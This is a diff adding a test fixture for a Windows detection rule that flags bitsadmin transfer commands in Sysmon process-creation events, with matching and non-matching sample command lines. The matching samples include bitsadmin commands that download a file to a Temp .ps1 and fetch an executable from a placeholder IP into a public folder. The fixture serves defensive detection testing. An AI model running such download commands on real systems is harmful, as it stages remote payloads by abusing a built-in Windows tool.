@@ -1,0 +1,12 @@
+rule: proc_creation_bitsadmin_transfer
+base: {Channel: Microsoft-Windows-Sysmon/Operational, EventID: 1, Image: 'C:\Windows\System32\bitsadmin.exe'}
+match:
+  - name: OTRF sample
+    event: {CommandLine: 'bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1'}
+  - name: addfile to an existing job
+    event: {CommandLine: 'bitsadmin /addfile job1 http://198.51.100.7/p.exe C:\Users\Public\p.exe'}
+no_match:
+  - name: listing jobs
+    event: {CommandLine: 'bitsadmin /list /allusers /verbose'}
+  - name: job created without a URL yet
+    event: {CommandLine: 'bitsadmin /create job1'}
